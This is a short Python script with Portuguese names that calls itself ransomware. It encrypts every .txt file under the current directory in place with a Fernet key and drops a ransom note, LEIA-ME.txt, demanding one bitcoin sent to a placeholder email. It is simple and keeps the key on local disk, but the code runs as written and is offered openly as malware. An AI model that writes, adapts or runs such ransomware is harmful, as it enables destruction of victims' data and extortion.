from cryptography.fernet import Fernet
import os

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

def carregar_chave():
    return open("chave.key", "rb").read()

def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_confidenciais = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_confidenciais)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            if nome.endswith(".txt"):
                caminho = os.path.join(raiz, nome)
                if nome != "ransomware.py" and not nome.endswith(".key") and nome != "LEIA-ME.txt":
                    lista.append(caminho)
    return lista

def criar_mensagem_resgate():
    with open("LEIA-ME.txt", "w") as f:
        f.write("Seus arquivos foram criptografados!\n")
        f.write("Para recuperar seus arquivos, envie 1 bitcoin para o email X, depois envie o comprovante!\n")
        f.write("Depois disso, enviaremos a chave para você recuperar seus dados!.\n")

def main():
    diretorio_alvo = "."
    if not os.path.exists("chave.key"):
        gerar_chave()
    chave = carregar_chave()
    criar_mensagem_resgate() 
    arquivos = encontrar_arquivos(diretorio_alvo)
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
    print("Ransomware executado com sucesso!! Arquivos criptografados.")

if __name__ == "__main__":
    main()
